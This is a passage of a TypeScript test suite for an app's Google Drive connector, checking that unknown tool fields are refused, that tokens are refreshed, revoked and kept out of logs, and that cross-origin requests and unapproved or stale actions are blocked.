  assert.match(deck.body.result!, /^Created the Google Slides deck "Trip" with 2 slides: https:\/\/docs\.google\.com\/presentation\/d\/made_slides_\d+\/edit$/);
  const update = mock.googleLog.writes.find((w) => w.kind === "slides-update")!;
  assert.deepEqual(
    (update.body.requests as Record<string, { text?: string; objectId?: string }>[]).filter((r) => r.insertText).map((r) => r.insertText.text),
    ["Day 1", "Oslo", "Day 2", "Bergen"],
  );
  assert.deepEqual((update.body.requests as Record<string, unknown>[]).at(-1), { deleteObject: { objectId: "p" } }, "the deck's own first slide goes");
  assert.deepEqual(
    mock.googleLog.writes.map((w) => w.kind),
    ["doc", "doc-text", "append", "sheet", "append", "slides", "slides-update"],
  );
  assert.equal(await balance(user.id), b1, "approving and cancelling cost nothing");
});

test("a field a tool doesn't have is refused, never dropped: what runs is exactly what the card showed", async () => {
  const user = await account("g-fields");
  const id = await withFiles(user, [DOC, SHEET]);
  replies.push(
    { blocks: [{ type: "tool_use", id: "toolu_1", name: "google-drive__read_file", input: { file_id: DOC, share_with: "someone@example.com" } }], stop: "tool_use" },
    { blocks: [{ type: "text", text: "That didn't work." }], stop: "end_turn" },
  );
  const reads = mock.googleLog.calls.length;
  await chat(user, "Read my trip plan", [id]);
  assert.match(JSON.stringify(sent[1].messages), /tool_result.*That input wasn't usable: share_with isn't a field of this tool/);
  assert.equal(mock.googleLog.calls.length, reads, "nothing was asked of Google");

  // A write with one gets no card at all: refused before it is proposed.
  replies.length = 0;
  sent.length = 0;
  replies.push(
    { blocks: [{ type: "tool_use", id: "toolu_2", name: "google-drive__create_doc", input: { title: "Shared", text: "Hi", share_with: "someone@example.com" } }], stop: "tool_use" },
    { blocks: [{ type: "text", text: "That didn't work." }], stop: "end_turn" },
  );
  const events = await chat(user, "Make a Doc and share it", [id]);
  assert.ok(!events.some((e) => e.type === "approve_action"), "no card");
  assert.match(JSON.stringify(sent[1].messages), /tool_result.*That input wasn't usable: share_with isn't a field of this tool/);
  assert.equal((await all("SELECT id FROM pending_actions WHERE user_id = ?", [user.id])).length, 0);

  // Claude is told each tool (and each slide) takes nothing else, and every tool's input goes through
  // the connector loop's check (inputProblem) for it, in the same words as the client's backstop.
  const kit = (await chatKit(user.id, [id]))!;
  for (const tool of kit.tools) assert.equal((tool.definition.input_schema as { additionalProperties?: unknown }).additionalProperties, false, tool.tool);
  const samples: Record<string, Record<string, unknown>> = {
    list_files: {},
    read_file: { file_id: DOC },
    create_doc: { title: "T", text: "Hi" },
    create_sheet: { title: "T", rows: [["a"]] },
    create_slides: { title: "T", slides: [{ title: "a", body: "b" }] },
    append_rows: { file_id: SHEET, rows: [["a"]] },
  };
  assert.deepEqual(Object.keys(samples).sort(), kit.tools.map((t) => t.tool).sort());
  for (const tool of kit.tools) {
    const schema = tool.definition.input_schema as Record<string, unknown>;
    assert.equal(inputProblem(schema, samples[tool.tool]), "", tool.tool);
    assert.equal(inputProblem(schema, { ...samples[tool.tool], share_with: "x" }), "share_with isn't a field of this tool", tool.tool);
  }
  const deckSchema = kit.tools.find((t) => t.tool === "create_slides")!.definition.input_schema as { properties: { slides: { items: { additionalProperties?: unknown } } } };
  assert.equal(deckSchema.properties.slides.items.additionalProperties, false);
  // Cards made with one anyway never send anything.
  const doc = (await kit.propose(kit.tools.find((t) => t.tool === "create_doc")!, { title: "Shared", text: "Hi", share_with: "someone@example.com" }))!;
  const deck = (await kit.propose(kit.tools.find((t) => t.tool === "create_slides")!, { title: "Trip", slides: [{ title: "Day 1", body: "Oslo", notes: "secret" }] }))!;
  const rows = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["Taxi", 30]], valueInputOption: "USER_ENTERED" }))!;
  await kit.close();
  const before = mock.googleLog.calls.length;
  for (const [card, why] of [
    [doc, "share_with isn't a field of this tool"],
    [deck, "a slide has only a title and a body"],
    [rows, "valueInputOption isn't a field of this tool"],
  ] as const) {
    const done = await answer(user, card);
    assert.equal(done.body.status, "failed");
    assert.equal(done.body.result, `That input wasn't usable: ${why}.`);
  }
  assert.equal(mock.googleLog.calls.length, before, "nothing was sent to Google");
  assert.equal(mock.googleLog.writes.length, 0);
});

test("Google's rate limit: a clear note, in the user's language on a card, and no retry", async () => {
  const user = await account("g-limit");
  const id = await withFiles(user, [SHEET]);
  mock.reset();
  mock.google.rateLimited = true;
  const kit = (await chatKit(user.id, [id]))!;
  const out = await kit.run(kit.tools.find((t) => t.tool === "read_file")!, { file_id: SHEET });
  assert.deepEqual(out, { text: GOOGLE_PROBLEMS.rate, isError: true });
  assert.equal(mock.googleLog.calls.length, 1, "asked once");
  const card = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["x"]] }))!;
  await kit.close();
  const done = (await runApproved(user.id, card.id, card.inputHash))!;
  assert.equal(done.status, "failed");
  assert.equal(done.result, GOOGLE_PROBLEMS.rate);
  const fr = JSON.parse((await import("node:fs")).readFileSync(new URL("../src/lib/i18n/fr.json", import.meta.url), "utf8")) as Record<string, string>;
  assert.equal(failedText(done.result, (text) => translate(fr, text)), fr[GOOGLE_PROBLEMS.rate]);
  assert.equal(mock.googleLog.writes.length, 0);
});

test("token refresh: one at a time, saved before use; invalid_grant asks for Reconnect, with no retry", async () => {
  const user = await account("g-refresh");
  const id = await withFiles(user, [DOC]);
  const before = (await googleRow(user.id))!;
  mock.reset();
  mock.expireGoogleTokens();
  await sql("UPDATE connections SET expires_at = 1 WHERE id = ?", [id]);
  mock.google.refreshDelayMs = 300;
  // Two replies at once, both needing the token renewed.
  const [a, b] = await Promise.all([chatKit(user.id, [id]), chatKit(user.id, [id])]);
  const readDoc = (kit: NonNullable<typeof a>) => kit.run(kit.tools.find((t) => t.tool === "read_file")!, { file_id: DOC });
  const [ra, rb] = await logsOf(() => Promise.all([readDoc(a!), readDoc(b!)]));
  await a!.close();
  await b!.close();
  assert.equal(mock.googleLog.refreshes, 1, "exactly one refresh");
  for (const r of [ra, rb]) assert.match(r.text, /^Google Doc "Trip plan"/);
  const renewed = (await googleRow(user.id))!;
  assert.notEqual(renewed.enc_access, before.enc_access);
  assert.equal(renewed.refreshing_until, null);
  assert.ok(Number(renewed.expires_at) > Date.now());
  assert.ok(logs.some((l) => l.includes(`connector ${id} google-drive refreshed`)));

  // Google refuses the refresh token (the user removed Flash's access there): Reconnect, asked once.
  mock.reset();
  mock.google.refuseRefresh = true;
  await sql("UPDATE connections SET expires_at = 1 WHERE id = ?", [id]);
  const kit = (await chatKit(user.id, [id]))!;
  const result = await kit.run(kit.tools.find((t) => t.tool === "read_file")!, { file_id: DOC });
  await kit.close();
  assert.equal(result.isError, true);
  assert.equal(mock.googleLog.refreshes, 1, "no retry loop");
  assert.equal((await googleRow(user.id))!.status, "needs_reconnect");
  const view = JSON.parse(await read(await connectRoute.GET(request("GET", "/api/connect", user)))) as { connections: { status: string; signIn: boolean }[] };
  assert.deepEqual([view.connections[0].status, view.connections[0].signIn], ["needs_reconnect", true]);
  assert.equal(await chatKit(user.id, [id]), null);
  assert.equal((await pickerToken(user, id)).status, 409);
  assert.equal(mock.googleLog.refreshes, 1);
  // Reconnect asks for Google's consent page again, so Google sends a new refresh token.
  const again = await start(user, { connectionId: id });
  assert.equal(new URL(again.body.url!).searchParams.get("prompt"), "consent");
});

test("Reconnect as another Google account: the old account's grant is cancelled at Google, and its picked files and waiting cards are forgotten", async () => {
  const user = await account("g-switch");
  const id = await withFiles(user, [SHEET]);
  const kit = (await chatKit(user.id, [id], { replyId: "sw1" }))!;
  const card = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["old account"]] }))!;
  await kit.close();
  mock.google.sub = "110000000000000000002";
  mock.google.email = "other-user@example.com";
  assert.equal(await connect(user, { connectionId: id }), "ok");
  const row = (await googleRow(user.id))!;
  assert.equal(row.id, id, "still the one Google Drive account");
  assert.equal(row.resource, "other-user@example.com");
  assert.equal(JSON.parse(String(row.endpoints_json)).sub, "110000000000000000002");
  assert.equal(row.account_id, "110000000000000000002");
  assert.deepEqual(await filesOf(id), [], "the old account's files are forgotten");
  assert.deepEqual(mock.googleLog.revoked, ["refresh"], "the old account's grant was cancelled");
  assert.deepEqual(mock.googleLive(), { access: 1, refresh: 1 }, "the new account's tokens still work");
  assert.equal((await answer(user, card)).status, 409, "the old account's card was cancelled");
  assert.equal(mock.googleLog.writes.length, 0);
  const kit2 = (await chatKit(user.id, [id]))!;
  assert.match((await kit2.run(kit2.tools.find((t) => t.tool === "list_files")!, {})).text, /hasn't picked any files/);
  await kit2.close();
});

test("a reply that read one Google account makes no card after a sign-in as another; one for the account connected now runs", async () => {
  const user = await account("g-switch-reply");
  const id = await withFiles(user, [SHEET]);
  const before = (await chatKit(user.id, [id]))!;
  // An approved action already on its way for the old account goes with it, whatever its state.
  const running = (await before.propose(before.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["running"]] }))!;
  await sql("UPDATE pending_actions SET status = 'running' WHERE id = ?", [running.id]);

  mock.google.sub = "110000000000000000003";
  mock.google.email = "third-user@example.com";
  assert.equal(await connect(user, { connectionId: id }), "ok");
  assert.equal((await googleRow(user.id))!.account_id, "110000000000000000003");
  assert.equal(await one("SELECT id FROM pending_actions WHERE user_id = ?", [user.id]), null, "nothing of the old account waits or runs");
  assert.equal(
    await before.propose(before.tools.find((t) => t.tool === "create_doc")!, { title: "As the old account", text: "Hi" }),
    null,
    "the reply read the old account: no card",
  );
  await before.close();

  const after = (await chatKit(user.id, [id]))!;
  const card = (await after.propose(after.tools.find((t) => t.tool === "create_doc")!, { title: "As the new account", text: "Hi" }))!;
  await after.close();
  assert.equal((await answer(user, card)).body.status, "done");
  assert.ok(mock.googleLog.writes.length > 0);
  assert.ok(!JSON.stringify(mock.googleLog.writes).includes("As the old account"), "only the card made for the account connected now ran");
  assert.ok(!JSON.stringify(mock.googleLog.writes).includes("running"));

  // The same account again: its waiting cards stay.
  const kit = (await chatKit(user.id, [id]))!;
  const waiting = (await kit.propose(kit.tools.find((t) => t.tool === "create_doc")!, { title: "Still waits", text: "Hi" }))!;
  await kit.close();
  assert.equal(await connect(user, { connectionId: id }), "ok");
  assert.ok(await one("SELECT id FROM pending_actions WHERE id = ? AND status = 'pending'", [waiting.id]));
});

test("removing Google Drive revokes Flash's access at Google and forgets the picked files; only from Flash's own page", async () => {
  const user = await account("g-remove");
  const id = await withFiles(user, [DOC, SHEET]);
  const kit = (await chatKit(user.id, [id], { replyId: "rm1" }))!;
  const card = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["late"]] }))!;
  await kit.close();
  const b0 = await balance(user.id);
  const remove = (origin: string | null = ORIGIN) => connectRoute.DELETE(request("DELETE", "/api/connect", user, { id }, origin));
  assert.equal((await remove(null)).status, 403);
  assert.equal((await remove("https://evil.example")).status, 403);
  assert.ok(await googleRow(user.id));
  assert.equal(mock.googleLog.revoked.length, 0);

  const res = await logsOf(() => remove());
  assert.equal(res.status, 200);
  assert.deepEqual(mock.googleLog.revoked, ["refresh"], "the refresh token was sent, so Google ends the whole grant");
  assert.deepEqual(mock.googleLive(), { access: 0, refresh: 0 }, "nothing Google gave works any more");
  assert.equal(await googleRow(user.id), null);
  assert.deepEqual(await filesOf(id), [], "the picked files are forgotten");
  assert.equal((await all("SELECT * FROM connection_tools WHERE connection_id = ?", [id])).length, 0);
  assert.ok(logs.some((l) => l.includes(`connector ${id} google-drive revoke ok`)));
  assert.equal(await balance(user.id), b0, "removing costs nothing");
  // A card made before: never runs.
  assert.notEqual((await answer(user, card)).body.status, "done");
  assert.equal(mock.googleLog.writes.length, 0);
});

test("Google Drive is hidden everywhere until all four of its variables are set (and CONNECTOR_KEYS)", async () => {
  const user = await account("g-hidden");
  const id = await withFiles(user, [SHEET]);
  const kit = (await chatKit(user.id, [id], { replyId: "h1" }))!;
  const card = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["hidden"]] }))!;
  await kit.close();
  const cases: [string, string][] = [
    ["GOOGLE_CONNECT_CLIENT_ID", ""],
    ["GOOGLE_CONNECT_CLIENT_SECRET", "  "],
    ["GOOGLE_PICKER_API_KEY", ""],
    ["GOOGLE_CONNECT_PROJECT_NUMBER", ""],
    ["GOOGLE_CONNECT_PROJECT_NUMBER", "flash-ai-connectors"],
  ];
  for (const [name, value] of cases) {
    const kept = process.env[name];
    process.env[name] = value;
    try {
      assert.equal(googleReady(), false, name);
      const listed = JSON.parse(await read(await connectRoute.GET(request("GET", "/api/connect", user)))) as { google: boolean; connections: unknown[] };
      assert.equal(listed.google, false, name);
      assert.deepEqual(listed.connections, [], `${name}: the account isn't listed`);
      assert.equal((await start(user)).status, 404, name);
      const picker = await pickerToken(user, id);
      assert.equal(picker.status, 404, name);
      assert.equal(picker.headers.get("cache-control"), "no-store");
      assert.equal((await files(user, "POST", { connectionId: id, ids: [SHEET] })).status, 404, name);
      assert.equal((await mcpStartRoute.POST(request("POST", "/api/connect/mcp/start", user, { provider: "google-drive" }))).status, 400, `${name}: nor through the other sign-in`);
      assert.equal(await chatKit(user.id, [id]), null, `${name}: no chat uses it`);
      assert.equal(await callback(user, "?code=x&state=y"), "failed", name);
      assert.deepEqual((await adminStats(30)).connectors.google, { setUp: false, missing: [name] }, name);
    } finally {
      process.env[name] = kept;
    }
  }
  assert.equal(googleReady(), true);
  const keys = process.env.CONNECTOR_KEYS;
  delete process.env.CONNECTOR_KEYS;
  try {
    assert.equal(googleReady(), false);
    assert.deepEqual((await adminStats(30)).connectors.google, { setUp: false, missing: ["CONNECTOR_KEYS"] });
  } finally {
    process.env.CONNECTOR_KEYS = keys;
  }
  // A card made before it was hidden doesn't run while it is.
  const number = process.env.GOOGLE_PICKER_API_KEY;
  delete process.env.GOOGLE_PICKER_API_KEY;
  try {
    assert.equal((await answer(user, card)).body.status, "failed");
  } finally {
    process.env.GOOGLE_PICKER_API_KEY = number;
  }
  assert.equal(mock.googleLog.writes.length, 0);
  assert.deepEqual((await adminStats(30)).connectors.google, { setUp: true, missing: [] });
});

test("only a confirmed account, from Flash's own page, starts Connect, and only Reconnects its own account", async () => {
  const unconfirmed = await account("g-unconfirmed", { verified: false });
  process.env.FLASH_DEMO_EMAILS = "true";
  try {
    const refused = await start(unconfirmed);
    assert.equal(refused.status, 403);
    assert.equal(refused.body.code, "unverified");
  } finally {
    delete process.env.FLASH_DEMO_EMAILS;
  }
  const user = await account("g-origin");
  for (const origin of [null, "null", "https://evil.example"]) assert.equal((await start(user, {}, origin)).status, 403);
  assert.equal(Number((await one<{ n: number }>("SELECT COUNT(*) AS n FROM connect_flows WHERE user_id = ?", [user.id]))!.n), 0);
  assert.equal((await connectRoute.POST(request("POST", "/api/connect", user, { action: "add", provider: "google-drive", token: "ya29.x" }))).status, 400, "never added with a key");
  const owner = await account("g-owner");
  assert.equal(await connect(owner), "ok");
  assert.equal((await start(user, { connectionId: (await googleRow(owner.id))!.id as string })).status, 404);
});

test("no token, client secret or API key in any answer but the Picker's, nor in a log, the database or the stand-in Claude's requests", async () => {
  const user = await account("g-secrets");
  await logsOf(async () => {
    const id = await withFiles(user, [SHEET, DOC]);
    replies.push(
      { blocks: [{ type: "tool_use", id: "toolu_1", name: "google-drive__read_file", input: { file_id: SHEET } }], stop: "tool_use" },
      { blocks: [{ type: "text", text: "Your budget." }], stop: "end_turn" },
    );
    await chat(user, "Read my budget", [id]);
    replies.push(
      { blocks: [{ type: "tool_use", id: "toolu_2", name: "google-drive__create_doc", input: { title: "Summary", text: "Hotel 120" } }], stop: "tool_use" },
      { blocks: [{ type: "text", text: "Waiting for you." }], stop: "end_turn" },
    );
    const card = (await chat(user, "Write a summary Doc", [id])).find((e) => e.type === "approve_action")!.action!;
    assert.equal((await answer(user, card)).body.status, "done");
    mock.expireGoogleTokens();
    await sql("UPDATE connections SET expires_at = 1 WHERE id = ?", [id]);
    const kit = (await chatKit(user.id, [id]))!;
    await kit.run(kit.tools.find((t) => t.tool === "list_files")!, {});
    await kit.close();
    await connectRoute.DELETE(request("DELETE", "/api/connect", user, { id }));
  });
  const tokens = mock.googleTokens();
  assert.ok(tokens.length >= 4);
  const tables = await all<{ name: string }>("SELECT name FROM sqlite_master WHERE type = 'table'");
  const database: string[] = [];
  for (const { name } of tables) database.push(JSON.stringify(await all(`SELECT * FROM ${name}`)));
  const claudeSaw = JSON.stringify(sent);
  assert.ok(claudeSaw.includes("Hotel,120"), "Claude got the result");
  const places = { answers: answers.join("\n"), logs: logs.join("\n"), database: database.join("\n"), claude: claudeSaw };
  for (const secret of [...tokens, SECRET, API_KEY]) {
    for (const [where, text] of Object.entries(places)) assert.ok(!text.includes(secret), `${secret.slice(0, 6)}… in ${where}`);
  }
  assert.ok(pickerAnswers.some((a) => tokens.some((t) => a.includes(t))), "the Picker's own answers did carry the user's token");
});
